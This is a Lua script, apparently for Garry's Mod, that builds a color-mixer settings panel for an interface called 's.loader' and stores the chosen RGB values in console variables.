RunConsoleCommand("s.loader.colorchanges", 1)

function getcolormixer(numb, alpha)
if numb == 1 then
return Color(convarco11:GetInt(),convarco12:GetInt(),convarco13:GetInt(), alpha)
elseif numb == 2 then
return Color(convarco21:GetInt(),convarco22:GetInt(),convarco23:GetInt(), alpha)
elseif numb == 3 then
return Color(convarco31:GetInt(),convarco32:GetInt(),convarco33:GetInt(), alpha)
elseif numb == 4 then
return Color(convarco41:GetInt(),convarco42:GetInt(),convarco43:GetInt(), alpha)
elseif numb == 5 then
return Color(convarco51:GetInt(),convarco52:GetInt(),convarco53:GetInt(), alpha)
elseif numb == 6 then
return Color(convarco61:GetInt(),convarco62:GetInt(),convarco63:GetInt(), alpha)
end
end



local function updatecolortextodime()
nameskipbody:SetColor(getcolormixer(2, 255))
podpiskabody:SetColor(getcolormixer(2, 255))
textobnovbody:SetColor(getcolormixer(2, 255))
autozapiskbody:SetColor(getcolormixer(2, 255))
end



local function enablecolor(red, green, blue)
if convarcolorchanges:GetInt() == 1 then
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
elseif convarcolorchanges:GetInt() == 2 then
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
updatecolortextodime()
elseif convarcolorchanges:GetInt() == 3 then
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
elseif convarcolorchanges:GetInt() == 4 then
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
elseif convarcolorchanges:GetInt() == 5 then
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
elseif convarcolorchanges:GetInt() == 6 then
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
end
end




local Mixer = vgui.Create("DColorMixer", panelsetting)
--Mixer:Dock(FILL)					-- Make Mixer fill place of Frame
Mixer:SetSize(185, 110)
Mixer:SetPos(25, 130)
Mixer:SetPalette(false)  			
Mixer:SetAlphaBar(false) 			
Mixer:SetWangs(true) 				
Mixer:SetColor(getcolormixer(1)) 	


Mixer.ValueChanged = function(testt)
enablecolor(Mixer:GetColor().r, Mixer:GetColor().g, Mixer:GetColor().b)
end 





